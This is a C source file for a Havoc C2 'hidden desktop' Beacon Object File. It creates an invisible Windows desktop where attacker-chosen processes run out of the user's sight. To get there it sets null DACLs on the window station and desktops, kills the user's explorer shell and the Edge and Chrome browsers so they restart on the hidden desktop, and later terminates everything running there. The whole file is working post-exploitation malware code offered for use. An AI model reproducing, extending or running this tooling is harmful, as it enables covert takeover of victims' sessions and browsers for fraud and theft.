/*
 * hdesktop.c - Hidden Desktop BOF for Havoc C2
 *
 * Creates and manages a hidden Windows desktop using CreateDesktopW.
 * Processes launched on the hidden desktop are invisible to the real user.
 * Uses legitimate Windows APIs (CreateDesktopW is used by Chrome, VMware, etc.)
 *
 * BOF args (packed):
 *   int32 action       - 0=create, 1=run process, 2=close/teardown
 *   str   desktop_name - name for the hidden desktop
 *   str   process_cmd  - command to launch (actions 0, 1)
 */

#include <windows.h>
#include <tlhelp32.h>
#include "beacon.h"

DECLSPEC_IMPORT HDESK   WINAPI USER32$CreateDesktopW(LPCWSTR, LPCWSTR, void*, DWORD, ACCESS_MASK, LPSECURITY_ATTRIBUTES);
DECLSPEC_IMPORT HDESK   WINAPI USER32$OpenDesktopW(LPCWSTR, DWORD, BOOL, ACCESS_MASK);
DECLSPEC_IMPORT BOOL    WINAPI USER32$CloseDesktop(HDESK);
DECLSPEC_IMPORT BOOL    WINAPI USER32$EnumDesktopWindows(HDESK, WNDENUMPROC, LPARAM);
DECLSPEC_IMPORT DWORD   WINAPI USER32$GetWindowThreadProcessId(HWND, LPDWORD);

DECLSPEC_IMPORT BOOL    WINAPI KERNEL32$CreateProcessW(LPCWSTR, LPWSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCWSTR, LPSTARTUPINFOW, LPPROCESS_INFORMATION);
DECLSPEC_IMPORT BOOL    WINAPI KERNEL32$CloseHandle(HANDLE);
DECLSPEC_IMPORT DWORD   WINAPI KERNEL32$GetLastError(void);
DECLSPEC_IMPORT DWORD   WINAPI KERNEL32$GetCurrentProcessId(void);
DECLSPEC_IMPORT int     WINAPI KERNEL32$MultiByteToWideChar(UINT, DWORD, LPCSTR, int, LPWSTR, int);
DECLSPEC_IMPORT LPVOID  WINAPI KERNEL32$VirtualAlloc(LPVOID, SIZE_T, DWORD, DWORD);
DECLSPEC_IMPORT BOOL    WINAPI KERNEL32$VirtualFree(LPVOID, SIZE_T, DWORD);
DECLSPEC_IMPORT HANDLE  WINAPI KERNEL32$OpenProcess(DWORD, BOOL, DWORD);
DECLSPEC_IMPORT BOOL    WINAPI KERNEL32$TerminateProcess(HANDLE, UINT);

DECLSPEC_IMPORT BOOL    WINAPI ADVAPI32$InitializeSecurityDescriptor(PSECURITY_DESCRIPTOR, DWORD);
DECLSPEC_IMPORT BOOL    WINAPI ADVAPI32$SetSecurityDescriptorDacl(PSECURITY_DESCRIPTOR, BOOL, PACL, BOOL);
DECLSPEC_IMPORT BOOL    WINAPI USER32$SetUserObjectSecurity(HANDLE, PSECURITY_INFORMATION, PSECURITY_DESCRIPTOR);
DECLSPEC_IMPORT HWINSTA WINAPI USER32$GetProcessWindowStation(void);
DECLSPEC_IMPORT HWINSTA WINAPI USER32$OpenWindowStationW(LPCWSTR, BOOL, ACCESS_MASK);
DECLSPEC_IMPORT BOOL    WINAPI USER32$SetProcessWindowStation(HWINSTA);
DECLSPEC_IMPORT BOOL    WINAPI USER32$CloseWindowStation(HWINSTA);
DECLSPEC_IMPORT HDESK   WINAPI USER32$GetThreadDesktop(DWORD);
DECLSPEC_IMPORT BOOL    WINAPI USER32$SetThreadDesktop(HDESK);
DECLSPEC_IMPORT DWORD   WINAPI KERNEL32$GetCurrentThreadId(void);
DECLSPEC_IMPORT void    WINAPI KERNEL32$Sleep(DWORD);
DECLSPEC_IMPORT BOOL    WINAPI USER32$SwitchDesktop(HDESK);
DECLSPEC_IMPORT HWND    WINAPI USER32$FindWindowW(LPCWSTR, LPCWSTR);

DECLSPEC_IMPORT HANDLE  WINAPI KERNEL32$CreateToolhelp32Snapshot(DWORD, DWORD);
DECLSPEC_IMPORT BOOL    WINAPI KERNEL32$Process32FirstW(HANDLE, void*);
DECLSPEC_IMPORT BOOL    WINAPI KERNEL32$Process32NextW(HANDLE, void*);

static int wname_match(const wchar_t *str, const wchar_t *pat) {
    int i;
    for (i = 0; pat[i]; i++) {
        wchar_t a = str[i], b = pat[i];
        if (a >= L'A' && a <= L'Z') a += 32;
        if (b >= L'A' && b <= L'Z') b += 32;
        if (a != b) return 0;
    }
    return str[i] == 0;
}

static int kill_by_name(const wchar_t *name) {
    HANDLE hSnap = KERNEL32$CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) return 0;

    PROCESSENTRY32W pe;
    pe.dwSize = sizeof(PROCESSENTRY32W);
    int killed = 0;
    DWORD myPid = KERNEL32$GetCurrentProcessId();

    if (KERNEL32$Process32FirstW(hSnap, &pe)) {
        do {
            if (pe.th32ProcessID != myPid && wname_match(pe.szExeFile, name)) {
                HANDLE h = KERNEL32$OpenProcess(0x0001, FALSE, pe.th32ProcessID);
                if (h) {
                    KERNEL32$TerminateProcess(h, 0);
                    KERNEL32$CloseHandle(h);
                    killed++;
                }
            }
            pe.dwSize = sizeof(PROCESSENTRY32W);
        } while (KERNEL32$Process32NextW(hSnap, &pe));
    }
    KERNEL32$CloseHandle(hSnap);
    return killed;
}


static void grant_full_access(HANDLE hObj) {
    SECURITY_DESCRIPTOR sd;
    ADVAPI32$InitializeSecurityDescriptor(&sd, SECURITY_DESCRIPTOR_REVISION);
    ADVAPI32$SetSecurityDescriptorDacl(&sd, TRUE, NULL, FALSE);
    SECURITY_INFORMATION si = DACL_SECURITY_INFORMATION;
    USER32$SetUserObjectSecurity(hObj, &si, &sd);
}


static wchar_t *to_wide(const char *s) {
    int len = KERNEL32$MultiByteToWideChar(CP_UTF8, 0, s, -1, NULL, 0);
    if (len <= 0) return NULL;
    wchar_t *w = (wchar_t *)KERNEL32$VirtualAlloc(NULL, len * sizeof(wchar_t),
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!w) return NULL;
    KERNEL32$MultiByteToWideChar(CP_UTF8, 0, s, -1, w, len);
    return w;
}


static DWORD _killed_pids[256];
static int _killed_count = 0;
static DWORD _my_pid = 0;

static BOOL CALLBACK enum_kill_cb(HWND hwnd, LPARAM lParam) {
    DWORD pid = 0;
    USER32$GetWindowThreadProcessId(hwnd, &pid);
    if (pid == 0 || pid == _my_pid) return TRUE;

    int i;
    for (i = 0; i < _killed_count; i++) {
        if (_killed_pids[i] == pid) return TRUE;
    }

    HANDLE hProc = KERNEL32$OpenProcess(0x0001, FALSE, pid); /* PROCESS_TERMINATE */
    if (hProc) {
        KERNEL32$TerminateProcess(hProc, 0);
        KERNEL32$CloseHandle(hProc);
        if (_killed_count < 256)
            _killed_pids[_killed_count++] = pid;
    }
    return TRUE;
}


static void launch_on_desktop(const char *desktop_name, const char *process_cmd) {
    wchar_t *wCmd = to_wide(process_cmd);
    if (!wCmd) {
        BeaconPrintf(CALLBACK_ERROR, "[!] String conversion failed for command");
        return;
    }

    wchar_t *wDeskName = to_wide(desktop_name);
    if (!wDeskName) {
        KERNEL32$VirtualFree(wCmd, 0, MEM_RELEASE);
        BeaconPrintf(CALLBACK_ERROR, "[!] String conversion failed for desktop name");
        return;
    }

    char desk_path[256];
    int i = 0, j = 0;
    const char *pfx = "WinSta0\\";
    while (pfx[i]) { desk_path[i] = pfx[i]; i++; }
    while (desktop_name[j] && i < 255) { desk_path[i++] = desktop_name[j++]; }
    desk_path[i] = 0;

    wchar_t *wDesk = to_wide(desk_path);
    if (!wDesk) {
        KERNEL32$VirtualFree(wCmd, 0, MEM_RELEASE);
        KERNEL32$VirtualFree(wDeskName, 0, MEM_RELEASE);
        BeaconPrintf(CALLBACK_ERROR, "[!] String conversion failed for desktop path");
        return;
    }

    /* Switch our thread to the hidden desktop before CreateProcessW.
       This makes explorer.exe see a fresh desktop and create a new
       shell (taskbar, start menu) instead of redirecting to the
       existing shell on the Default desktop. */
    HDESK hHidden = USER32$OpenDesktopW(wDeskName, 0, FALSE, GENERIC_ALL);
    HDESK hOrigDesk = NULL;
    if (hHidden) {
        hOrigDesk = USER32$GetThreadDesktop(KERNEL32$GetCurrentThreadId());
        USER32$SetThreadDesktop(hHidden);
    }

    STARTUPINFOW si;
    PROCESS_INFORMATION pi;
    int k;
    for (k = 0; k < (int)sizeof(si); k++) ((char*)&si)[k] = 0;
    for (k = 0; k < (int)sizeof(pi); k++) ((char*)&pi)[k] = 0;
    si.cb = sizeof(si);
    si.lpDesktop = wDesk;

    if (KERNEL32$CreateProcessW(NULL, wCmd, NULL, NULL, FALSE,
            CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)) {
        BeaconPrintf(CALLBACK_OUTPUT, "HDESKTOP:LAUNCHED:%s:PID=%lu",
            process_cmd, pi.dwProcessId);
        KERNEL32$CloseHandle(pi.hProcess);
        KERNEL32$CloseHandle(pi.hThread);
    } else {
        BeaconPrintf(CALLBACK_ERROR, "[!] CreateProcessW failed (err=%lu)",
            KERNEL32$GetLastError());
    }

    /* Restore thread desktop */
    if (hOrigDesk)
        USER32$SetThreadDesktop(hOrigDesk);
    if (hHidden)
        USER32$CloseDesktop(hHidden);

    KERNEL32$VirtualFree(wDesk, 0, MEM_RELEASE);
    KERNEL32$VirtualFree(wDeskName, 0, MEM_RELEASE);
    KERNEL32$VirtualFree(wCmd, 0, MEM_RELEASE);
}


void go(char *args, int alen) {
    datap parser;
    BeaconDataParse(&parser, args, alen);

    int action = BeaconDataInt(&parser);
    int name_len = 0;
    char *desktop_name = BeaconDataExtract(&parser, &name_len);
    int proc_len = 0;
    char *process_cmd = BeaconDataExtract(&parser, &proc_len);

    if (!desktop_name || !desktop_name[0])
        desktop_name = "HavocHD";

    wchar_t *wDesktopName = to_wide(desktop_name);
    if (!wDesktopName) {
        BeaconPrintf(CALLBACK_ERROR, "[!] String conversion failed");
        return;
    }

    if (action == 0) {
        /* Grant full access on the window station so child processes
           can connect and initialize user32/gdi32 DLLs */
        HWINSTA hWinSta = USER32$OpenWindowStationW(L"WinSta0", FALSE,
            READ_CONTROL | WRITE_DAC);
        if (hWinSta) {
            grant_full_access(hWinSta);
            HWINSTA hOldSta = USER32$GetProcessWindowStation();
            USER32$SetProcessWindowStation(hWinSta);
            USER32$CloseWindowStation(hWinSta);
        }

        /* Also grant access on the current (Default) desktop */
        HDESK hDefDesk = USER32$GetThreadDesktop(KERNEL32$GetCurrentThreadId());
        if (hDefDesk)
            grant_full_access(hDefDesk);

        SECURITY_DESCRIPTOR sd;
        ADVAPI32$InitializeSecurityDescriptor(&sd, SECURITY_DESCRIPTOR_REVISION);
        ADVAPI32$SetSecurityDescriptorDacl(&sd, TRUE, NULL, FALSE);

        SECURITY_ATTRIBUTES sa;
        sa.nLength = sizeof(sa);
        sa.lpSecurityDescriptor = &sd;
        sa.bInheritHandle = TRUE;

        HDESK hDesk = USER32$CreateDesktopW(wDesktopName, NULL, NULL,
            DF_ALLOWOTHERACCOUNTHOOK, GENERIC_ALL, &sa);
        if (!hDesk) {
            BeaconPrintf(CALLBACK_ERROR, "[!] CreateDesktopW failed (err=%lu)",
                KERNEL32$GetLastError());
            KERNEL32$VirtualFree(wDesktopName, 0, MEM_RELEASE);
            return;
        }

        /* Grant full access on the new desktop too */
        grant_full_access(hDesk);

        BeaconPrintf(CALLBACK_OUTPUT, "HDESKTOP:CREATED:%s", desktop_name);

        /* Step A: Kill the existing explorer shell */
        HWND hTray = USER32$FindWindowW(L"Shell_TrayWnd", NULL);
        DWORD shellPid = 0;
        if (hTray) {
            USER32$GetWindowThreadProcessId(hTray, &shellPid);
            if (shellPid) {
                HANDLE hShell = KERNEL32$OpenProcess(0x0001, FALSE, shellPid);
                if (hShell) {
                    KERNEL32$TerminateProcess(hShell, 0);
                    KERNEL32$CloseHandle(hShell);
                }
            }
        }
        BeaconPrintf(CALLBACK_OUTPUT, "HDESKTOP:KILL:%lu", shellPid);

        /* Step A2: Kill Chromium browsers so they start fresh on hidden desktop
           (Edge/Chrome are single-instance — if one is already running on Default,
           double-clicking on the hidden desktop just opens a tab there instead) */
        {
            int kb = 0;
            kb += kill_by_name(L"msedge.exe");
            kb += kill_by_name(L"chrome.exe");
            if (kb > 0)
                BeaconPrintf(CALLBACK_OUTPUT, "HDESKTOP:BROWSERS_KILLED:%d", kb);
        }

        /* Step B: Switch input to hidden desktop */
        HDESK hDefInput = USER32$OpenDesktopW(L"Default", 0, FALSE, GENERIC_ALL);
        BOOL switched = USER32$SwitchDesktop(hDesk);
        BeaconPrintf(CALLBACK_OUTPUT, "HDESKTOP:SWITCH:%d", switched);

        /* Step C: Launch explorer immediately on hidden desktop */
        launch_on_desktop(desktop_name, "C:\\Windows\\explorer.exe");

        /* Step D: Wait for shell to initialize while hidden is active */
        KERNEL32$Sleep(4000);

        /* Step E: Switch back to real desktop */
        if (hDefInput) {
            USER32$SwitchDesktop(hDefInput);
            USER32$CloseDesktop(hDefInput);
        }

        /* Step F: Launch user's process on hidden desktop */
        if (process_cmd && process_cmd[0])
            launch_on_desktop(desktop_name, process_cmd);

    } else if (action == 1) {
        if (!process_cmd || !process_cmd[0]) {
            BeaconPrintf(CALLBACK_ERROR, "[!] No process command specified");
            KERNEL32$VirtualFree(wDesktopName, 0, MEM_RELEASE);
            return;
        }
        launch_on_desktop(desktop_name, process_cmd);

    } else if (action == 2) {
        HDESK hDesk = USER32$OpenDesktopW(wDesktopName, 0, FALSE, GENERIC_ALL);
        if (!hDesk) {
            BeaconPrintf(CALLBACK_ERROR, "[!] Desktop '%s' not found", desktop_name);
            KERNEL32$VirtualFree(wDesktopName, 0, MEM_RELEASE);
            return;
        }

        _my_pid = KERNEL32$GetCurrentProcessId();
        _killed_count = 0;
        USER32$EnumDesktopWindows(hDesk, enum_kill_cb, 0);
        USER32$CloseDesktop(hDesk);
        BeaconPrintf(CALLBACK_OUTPUT, "HDESKTOP:CLOSED:%s:killed=%d",
            desktop_name, _killed_count);
    }

    KERNEL32$VirtualFree(wDesktopName, 0, MEM_RELEASE);
}
